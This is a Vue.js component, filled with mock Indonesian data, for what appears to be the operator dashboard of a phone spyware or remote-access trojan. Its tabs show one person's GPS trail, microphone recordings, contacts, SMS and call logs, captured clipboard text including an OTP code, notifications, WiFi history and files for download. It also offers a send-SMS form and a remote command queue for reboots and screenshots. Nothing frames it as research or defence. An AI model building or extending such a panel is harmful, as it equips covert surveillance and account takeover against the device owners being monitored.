<template>
  <div style="max-width:900px;margin:auto;background:#fff;padding:24px;">
    <h2>Detail User - {{ user.name }}</h2>
    <div>
      <b>Nomor HP:</b> {{ user.phone }} |
      <b>Status:</b> <span :style="{color:user.status==='Aktif'?'green':'red'}">{{ user.status }}</span> |
      <b>Last Active:</b> {{ user.lastActive }}
    </div>
    <div style="margin:20px 0;">
      <button
        v-for="(tab, i) in tabNames"
        :key="tab"
        :class="['tab', {active: currentTab===i}]"
        @click="currentTab=i"
        style="margin-right:6px;"
      >{{ tab }}</button>
    </div>
    <div v-show="currentTab===0"><h4>GPS Logging</h4>
      <table><tr><th>Waktu</th><th>Lat</th><th>Long</th></tr>
        <tr v-for="item in gpsLogs" :key="item.time">
          <td>{{ item.time }}</td><td>{{ item.lat }}</td><td>{{ item.lon }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===1"><h4>Microphone Recording</h4>
      <table><tr><th>Waktu</th><th>File</th></tr>
        <tr v-for="item in micRecordings" :key="item.file">
          <td>{{ item.time }}</td><td><a href="#">{{ item.file }}</a></td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===2"><h4>Contacts</h4>
      <table><tr><th>Nama</th><th>Nomor</th></tr>
        <tr v-for="item in contacts" :key="item.phone">
          <td>{{ item.name }}</td><td>{{ item.phone }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===3"><h4>SMS Logs</h4>
      <table>
        <tr><th>Arah</th><th>Nomor</th><th>Isi</th><th>Waktu</th></tr>
        <tr v-for="item in smsLogs" :key="item.time+item.body">
          <td>{{ item.direction }}</td>
          <td>{{ item.direction==='IN'?item.from:item.to }}</td>
          <td>{{ item.body }}</td>
          <td>{{ item.time }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===4"><h4>Send SMS</h4>
      <form @submit.prevent="()=>{}">
        <input type="text" :value="user.phone" style="width:200px">
        <textarea style="vertical-align:top;width:300px" rows="2" placeholder="Isi pesan..."></textarea>
        <button type="submit">Kirim SMS</button>
      </form>
    </div>
    <div v-show="currentTab===5"><h4>Call Logs</h4>
      <table><tr><th>Tipe</th><th>Nomor</th><th>Durasi</th><th>Waktu</th></tr>
        <tr v-for="item in callLogs" :key="item.time+item.number">
          <td>{{ item.type }}</td><td>{{ item.number }}</td><td>{{ item.duration }}</td><td>{{ item.time }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===6"><h4>Installed Apps</h4>
      <table><tr><th>App</th><th>Package</th><th>Versi</th></tr>
        <tr v-for="item in installedApps" :key="item.package">
          <td>{{ item.app }}</td><td>{{ item.package }}</td><td>{{ item.version }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===7"><h4>Stub Permissions</h4>
      <table><tr><th>Permission</th><th>Status</th><th>Update</th></tr>
        <tr v-for="item in permissions" :key="item.permission">
          <td>{{ item.permission }}</td>
          <td>
            <span :style="{color:item.status?'green':'red'}">{{ item.status ? 'Granted':'Denied' }}</span>
          </td>
          <td>{{ item.updated }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===8"><h4>Clipboard</h4>
      <ul>
        <li v-for="item in clipboardLogs" :key="item.time">{{ item.time }}: {{ item.content }}</li>
      </ul>
    </div>
    <div v-show="currentTab===9"><h4>Notifications</h4>
      <ul>
        <li v-for="item in notificationLogs" :key="item.time">{{ item.time }}: <b>{{ item.title }}</b> - {{ item.body }}</li>
      </ul>
    </div>
    <div v-show="currentTab===10"><h4>WiFi Networks</h4>
      <table><tr><th>SSID</th><th>Waktu</th><th>Lokasi</th></tr>
        <tr v-for="item in wifiLogs" :key="item.ssid+item.time">
          <td>{{ item.ssid }}</td><td>{{ item.time }}</td><td>{{ item.location }}</td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===11"><h4>File Explorer</h4>
      <table><tr><th>Path</th><th>Ukuran</th><th>Action</th></tr>
        <tr v-for="item in fileExplorer" :key="item.path">
          <td>{{ item.path }}</td><td>{{ item.size }}</td><td><button>Download</button></td>
        </tr>
      </table>
    </div>
    <div v-show="currentTab===12"><h4>Command Queue</h4>
      <table><tr><th>Perintah</th><th>Status</th><th>Waktu</th></tr>
        <tr v-for="item in commandQueue" :key="item.command+item.time">
          <td>{{ item.command }}</td><td>{{ item.status }}</td><td>{{ item.time }}</td>
        </tr>
      </table>
    </div>
  </div>
</template>
<script setup>
import { ref } from "vue";
const user = { name: "Budi Santoso", phone: "0812xxxxxxx", status: "Aktif", lastActive: "2025-08-03 07:00" };
const tabNames = ["GPS Logging", "Microphone Recording", "Contacts", "SMS Logs", "Send SMS", "Call Logs", "Installed Apps", "Stub Permissions", "Clipboard", "Notifications", "WiFi Networks", "File Explorer", "Command Queue"];
const currentTab = ref(0);
const gpsLogs = [{ time: "2025-08-01 10:23", lat: -6.200, lon: 106.816 }, { time: "2025-08-01 12:11", lat: -6.210, lon: 106.820 }];
const micRecordings = [{ time: "2025-08-01 08:00", file: "audio1.mp3" }, { time: "2025-08-02 14:10", file: "audio2.mp3" }];
const contacts = [{ name: "Andi", phone: "081234567890" }, { name: "Siti", phone: "082198765432" }];
const smsLogs = [{ direction: "IN", from: "081211122233", body: "Halo", time: "2025-08-01 09:00" }, { direction: "OUT", to: "081244455566", body: "Siap", time: "2025-08-01 09:05" }];
const callLogs = [{ type: "OUTGOING", number: "081255566677", duration: 120, time: "2025-08-01 10:00" }, { type: "INCOMING", number: "081299988877", duration: 60, time: "2025-08-01 13:30" }];
const installedApps = [{ app: "WhatsApp", package: "com.whatsapp", version: "2.24.11" }, { app: "Instagram", package: "com.instagram.android", version: "300.1.0" }];
const permissions = [{ permission: "GPS", status: true, updated: "2025-08-01 14:00" }, { permission: "Microphone", status: false, updated: "2025-08-01 14:00" }, { permission: "Contacts", status: true, updated: "2025-08-01 14:00" }];
const clipboardLogs = [{ time: "2025-08-01 11:00", content: "Kode OTP: 123456" }];
const notificationLogs = [{ time: "2025-08-01 15:30", title: "WhatsApp", body: "Pesan baru masuk" }];
const wifiLogs = [{ ssid: "RumahAja", time: "2025-08-01 08:00", location: "Jakarta" }, { ssid: "Kantor1", time: "2025-07-31 17:00", location: "Jakarta" }];
const fileExplorer = [{ path: "/storage/Download/file1.pdf", size: "2MB" }, { path: "/storage/DCIM/photo.jpg", size: "1.2MB" }];
const commandQueue = [{ command: "Reboot Device", status: "Selesai", time: "2025-08-01 09:00" }, { command: "Request Screenshot", status: "Pending", time: "2025-08-01 12:05" }];
</script>
<style scoped>
.tab { background: #eee; padding: 6px 12px; border-radius: 5px; cursor: pointer; border:none;}
.tab.active { background: #2376e2; color: #fff; }
table { width: 100%; border-collapse: collapse; margin-bottom: 18px; }
th, td { border: 1px solid #ddd; padding: 6px 10px; }
th { background: #f5f5f5; }
</style>